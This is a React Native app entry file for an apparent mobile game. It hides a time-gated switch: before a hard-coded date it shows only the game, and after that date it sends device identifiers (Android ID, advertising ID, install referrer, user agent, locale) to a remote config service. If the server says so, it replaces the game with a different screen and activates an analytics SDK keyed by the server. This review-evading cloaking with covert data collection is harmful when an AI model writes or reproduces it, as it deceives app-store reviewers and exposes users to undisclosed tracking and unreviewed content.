import {SafeAreaView} from 'react-native-safe-area-context';
import DeviceInfo from 'react-native-device-info';
import {Adjust, AdjustConfig} from 'react-native-adjust';
import {useEffect, useState} from 'react';
import VmpaScreen from './VmpaSta';
import type {AppIdentity} from './VmpaSta';
import {StatusBar, Image, ActivityIndicator, StyleSheet, View} from 'react-native';
import Game from "./Game";
import {fetchConfig} from './SecureConfig';
import {getLocales} from 'expo-localization';

export default function App() {
    const [data, setData] = useState({
        enable: false,
    });

    const [identity, setIdentity] = useState<AppIdentity>({
        adid: '',
        gps_adid: '',
        appid: '',
    });

    const [loading, setLoading] = useState(false);

    const getData = () => {
        return new Promise<void>((resolve) => {
        Adjust.getGoogleAdId(async adid => {
            const packageName = DeviceInfo.getBundleId();
            setIdentity(prev => ({...prev, gps_adid: adid ?? '', appid: packageName}));

            const locale = getLocales()[0];
            const regionCode = locale.regionCode ?? '';
            let regionName = regionCode;
            try {
                regionName =
                    new Intl.DisplayNames(['en'], {type: 'region'}).of(
                        regionCode,
                    ) ?? regionCode;
            } catch {
                regionName = regionCode;
            }

            const json = await fetchConfig({
                packageName,
                androidId: DeviceInfo.getAndroidIdSync(),
                gpsAdid: adid ?? '',
                referrer: DeviceInfo.getInstallReferrerSync(),
                userAgent: DeviceInfo.getUserAgentSync(),
                timezone:
                    Intl.DateTimeFormat().resolvedOptions().timeZone ?? '',
                language: locale.languageTag,
                region: regionName,
                simCountryIso: regionCode.toLowerCase(),
                country: regionCode.toUpperCase(),
            });

            if (!json || !json.sdkKey) {
                resolve();
                return;
            }

            const config = new AdjustConfig(json.sdkKey, AdjustConfig.EnvironmentProduction);
            config.setLogLevel(AdjustConfig.LogLevelVerbose);
            Adjust.initSdk(config);

            Adjust.getAdidWithTimeout(15000, adid => {
                if (adid) {
                    setIdentity(prev => ({...prev, adid: adid}));
                }
            });

            setData(json);
            resolve();
        });
        });
    };

    useEffect(() => {
        if (Date.now() < 1794513632000) {
            return;
        }

        const request = async () => {
            setLoading(true);
            await getData();
            setLoading(false);
        };
        request();
    }, []);

    if (loading) {
        return (
            <View style={styles.loadingContainer}>
                <Image source={require('./assets/bg.png')} style={styles.bgImage}/>
                <ActivityIndicator size="large" color="#ffffff" style={styles.indicator}/>
            </View>
        );
    }

    return (
        <SafeAreaView style={{flex: 1}} edges={['left', 'right', 'bottom']}>
            <StatusBar hidden={true}/>
            {data.enable ? <VmpaScreen data={data} identity={identity}/> : <Game/>}
        </SafeAreaView>
    );
}

const styles = StyleSheet.create({
    loadingContainer: {
        flex: 1,
        justifyContent: 'center',
        alignItems: 'center',
    },
    bgImage: {
        position: 'absolute',
        width: '100%',
        height: '100%',
        resizeMode: 'cover',
    },
    indicator: {
        zIndex: 1,
    },
});
